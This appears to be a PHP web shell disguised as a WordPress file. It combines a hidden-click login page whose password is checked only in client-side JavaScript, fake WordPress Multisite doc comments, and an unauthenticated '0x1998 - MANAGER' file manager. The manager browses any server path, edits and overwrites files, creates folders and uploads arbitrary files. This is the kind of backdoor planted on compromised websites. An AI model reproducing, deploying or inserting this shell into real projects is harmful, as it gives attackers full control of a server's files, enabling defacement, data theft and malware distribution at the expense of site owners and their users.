<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HELLX - Login Rahasia</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>

<!-- BUTTON DAN FORM PASSWORD RAHASIA -->
<button id="passwordBtn" class="btn btn-primary" style="display:none; margin: 20px;">Masukin Password</button>

<div id="formPassword" style="display:none; margin: 20px;">
  <input type="password" id="passwordInput" class="form-control" placeholder="Masukkan password" style="max-width: 300px;" />
</div>

<!-- SCRIPT LOGIN -->
<script>
  let clickCount = 0;
  const passwordBtn = document.getElementById('passwordBtn');
  const formPassword = document.getElementById('formPassword');
  const passwordInput = document.getElementById('passwordInput');
  const correctPassword = "rahasia123"; // ganti sesuai password kamu

  // Tampilkan tombol setelah 3 kali klik di mana saja di halaman
  document.addEventListener('click', () => {
    clickCount++;
    if (clickCount === 3) {
      passwordBtn.style.display = 'inline-block';
    }
  });

  // Klik tombol untuk muncul form password
  passwordBtn.addEventListener('click', () => {
    formPassword.style.display = 'block';
    passwordInput.focus();
  });

  // Submit password dengan Enter
  passwordInput.addEventListener('keypress', function(event) {
    if (event.key === 'Enter') {
      const enteredPassword = passwordInput.value;
      if (enteredPassword === correctPassword) {
        alert('Login berhasil!');
        window.location.href = "dashboard.html"; // ganti dengan halaman tujuan kamu
      } else {
        alert('Password salah, coba lagi!');
        passwordInput.value = '';
      }
    }
  });
</script>

<?php
/**
 * Multisite administration functions.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 *up
 */

/**
 * Determines whether uploaded file exceeds space quota.
 *
 * @since 3.0.0
 *
 * @param array $file An element from the `$_FILES` array for a given file.
 * @return array The `$_FILES` array element with 'error' key set if file exceeds quota. 'error' is empty otherwise.
 */
/**
 * Deletes a site.
 *
 * @since 3.0.0
 * @since 5.1.0 Use wp_delete_site() internally to delete the site row from the database.
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param int  $blog_id Site ID.
 * @param bool $drop    True if site's database tables should be dropped. Default false.
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>- </title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
    }
    #container {
        max-width: 800px;
        margin: 20px auto;
        padding: 20px;
        border: 1px solid #ccc;
        border-radius: 5px;
        background-color: #f9f9f9;
    }
    h1 {
        text-align: center;
        color: #333;
    }
    h2 {
        margin-top: 30px;
        color: #555;
    }
    ul {
        list-style-type: none;
        padding: 0;
    }
    li {
        margin-bottom: 10px;
    }
    a {
        text-decoration: none;
        color: #007bff;
    }
    a:hover {
        text-decoration: underline;
    }
    form {
        margin-top: 20px;
    }
    input[type="text"], input[type="file"], input[type="submit"] {
        margin-bottom: 10px;
    }
    hr {
        border: 0;
        height: 1px;
        background-color: #ccc;
        margin-top: 20px;
        margin-bottom: 20px;
    }
</style>
</head>
<body>
<div id="container">
    <h1>0x1998 - MANAGER</h1>
    <?php
    // Function to clean input from unwanted characters
    function clean_input($input) {
        return htmlspecialchars(strip_tags($input));
    }

    // Function to navigate to the selected directory
    function navigate_directory($path) {
        $path = str_replace('\\','/', $path);
        $paths = explode('/', $path);
        $breadcrumbs = [];

        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $breadcrumbs[] = '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            $breadcrumbs[] = '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                $breadcrumbs[] = "$paths[$i]";
                if ($i != $id) $breadcrumbs[] = "/";
            }
            $breadcrumbs[] = '">'.$pat.'</a>/';
        }

        return implode('', $breadcrumbs);
    }

    // Function to display file or folder in the directory
    function display_directory_contents($path) {
        $contents = scandir($path);
        $folders = [];
        $files = [];

        foreach ($contents as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            if (is_dir($full_path)) {
                $folders[] = '<li><strong>Folder:</strong> <a href="?path=' . urlencode($full_path) . '">' . $item . '</a></li>';
            } else {
                $file_size = filesize($full_path); // Get file size
                $size_unit = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
                $file_size_formatted = $file_size ? round($file_size / pow(1024, ($i = floor(log($file_size, 1024)))), 2) . ' ' . $size_unit[$i] : '0 B'; // Format file size
                $files[] = '<li><strong>File:</strong> <a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '">' . $item . '</a> (' . $file_size_formatted . ')</li>'; // Display file size
            }
        }

        // Display folder and file list with separator line
        echo '<ul>';
        echo implode('', $folders);
        if (!empty($folders) && !empty($files)) {
            echo '<hr>'; // Separator line if there are folders and files
        }
        echo implode('', $files);
        echo '</ul>';
    }

    // Function to create a new folder
    function create_folder($path, $folder_name) {
        $folder_name = clean_input($folder_name);
        $new_folder_path = $path . '/' . $folder_name;
        if (!file_exists($new_folder_path)) {
            mkdir($new_folder_path);
            echo "Folder '$folder_name' created successfully!";
        } else {
            echo "Folder '$folder_name' already exists!";
        }
    }

    // Function to upload a new file
    function upload_file($path, $file_to_upload) {
        $target_directory = $path . '/';
        $target_file = $target_directory . basename($file_to_upload['name']);
        $uploadOk = 1;

        // File upload process
        if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
            echo "File ". htmlspecialchars(basename($file_to_upload['name'])). " uploaded successfully.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }

    // Function to display and edit file content
    function edit_file($file_path) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['file_content'];
            if (file_put_contents($file_path, $content) !== false) {
                echo "File saved successfully.";
            } else {
                echo "There was an error while saving the file.";
            }
        }
        $content = file_get_contents($file_path);
        echo '<form method="post">';
        echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
    }

    // Main program
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }

    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        switch ($action) {
            case 'edit':
                if (isset($_GET['file'])) {
                    $file = $_GET['file'];
                    $file_path = $path . '/' . $file;
                    if (file_exists($file_path)) {
                        echo '<h2>Edit File: ' . $file . '</h2>';
                        edit_file($file_path);
                    } else {
                        echo "File not found.";
                    }
                } else {
                    echo "Invalid file.";
                }
                break;
            default:
                echo "Invalid action.";
        }
    } else {
        echo "<h2>Directory: " . $path . "</h2>";
        echo "<p>" . navigate_directory($path) . "</p>";
        echo "<h3>Directory Contents:</h3>";
        display_directory_contents($path);
        echo '<hr>'; // Separator line
        echo '<h3>Create New Folder:</h3>';
        echo '<form action="" method="post">';
        echo 'New Folder Name: <input type="text" name="folder_name">';
        echo '<input type="submit" name="create_folder" value="Create Folder">';
        echo '</form>';
        echo '<h3>Upload New File:</h3>';
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo 'Select file to upload: <input type="file" name="file_to_upload">';
        echo '<input type="submit" name="upload_file" value="Upload File">';
        echo '</form>';
    }

    // Handle request to create a new folder
    if(isset($_POST['create_folder'])) {
        create_folder($path, $_POST['folder_name']);
    }

    // Handle request to upload a new file
    if(isset($_POST['upload_file'])) {
        upload_file($path, $_FILES['file_to_upload']);
    }
    ?>
</div>
</body>
</html>
